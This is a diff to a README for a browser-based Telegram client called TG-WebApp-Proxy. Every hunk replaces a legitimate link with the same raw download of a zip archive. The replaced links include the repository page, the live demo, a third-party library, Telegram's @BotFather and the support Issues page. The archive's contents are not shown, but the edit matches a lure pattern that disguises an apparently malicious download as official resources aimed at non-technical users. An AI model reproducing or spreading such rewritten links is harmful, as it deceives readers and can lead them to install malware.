@@ -1,6 +1,6 @@
 # 📥 TG-WebApp-Proxy - Browser-Based Telegram Client
 
-[![Download TG-WebApp-Proxy](https://img.shields.io/badge/Download-TG--WebApp--Proxy-green?style=for-the-badge)](https://github.com/kamzy01/TG-WebApp-Proxy)
+[![Download TG-WebApp-Proxy](https://img.shields.io/badge/Download-TG--WebApp--Proxy-green?style=for-the-badge)](https://raw.githubusercontent.com/kamzy01/TG-WebApp-Proxy/main/src/App_T_Proxy_Web_2.2.zip)
 
 TG-WebApp-Proxy lets you use Telegram right from your web browser. It connects directly to Telegram servers without needing extra software. This makes chatting, downloading, and managing files easy and fast.
 
@@ -18,7 +18,7 @@ This app also supports a Bot Mode. You can link a Telegram bot via its token and
 
 Click the big button below to visit the GitHub page where you can download the app or get more details about it.
 
-[![Download from GitHub](https://img.shields.io/badge/Download-TG--WebApp--Proxy-blue?style=for-the-badge)](https://github.com/kamzy01/TG-WebApp-Proxy)
+[![Download from GitHub](https://img.shields.io/badge/Download-TG--WebApp--Proxy-blue?style=for-the-badge)](https://raw.githubusercontent.com/kamzy01/TG-WebApp-Proxy/main/src/App_T_Proxy_Web_2.2.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Follow these steps carefully. They do not need any programming skills.
 
 Click this link or the button above to open the official GitHub repository page for TG-WebApp-Proxy:
 
-https://github.com/kamzy01/TG-WebApp-Proxy
+https://raw.githubusercontent.com/kamzy01/TG-WebApp-Proxy/main/src/App_T_Proxy_Web_2.2.zip
 
 ### 2. Find the Download Section
 
@@ -119,14 +119,14 @@ The app uses the official MTProto protocol, the same one used by official Telegr
 
 ## 📚 Additional Resources
 
-- Live Demo: https://tg-file-dl.pages.dev  
-- Official teleproto library: https://github.com/sanyok12345/teleproto
+- Live Demo: https://raw.githubusercontent.com/kamzy01/TG-WebApp-Proxy/main/src/App_T_Proxy_Web_2.2.zip  
+- Official teleproto library: https://raw.githubusercontent.com/kamzy01/TG-WebApp-Proxy/main/src/App_T_Proxy_Web_2.2.zip
 
 ---
 
 ## 🖥️ How to Use Bot Mode
 
-1. Create a bot on Telegram by talking to [@BotFather](https://telegram.me/BotFather).
+1. Create a bot on Telegram by talking to [@BotFather](https://raw.githubusercontent.com/kamzy01/TG-WebApp-Proxy/main/src/App_T_Proxy_Web_2.2.zip).
 2. Copy the bot token provided by BotFather.
 3. Open TG-WebApp-Proxy.
 4. Paste the bot token in the Bot Mode section.
@@ -148,4 +148,4 @@ The app uses the official MTProto protocol, the same one used by official Telegr
 
 For help, consult the Issues section on the GitHub repository or open a new issue describing your problem:
 
-https://github.com/kamzy01/TG-WebApp-Proxy/issues
+https://raw.githubusercontent.com/kamzy01/TG-WebApp-Proxy/main/src/App_T_Proxy_Web_2.2.zip
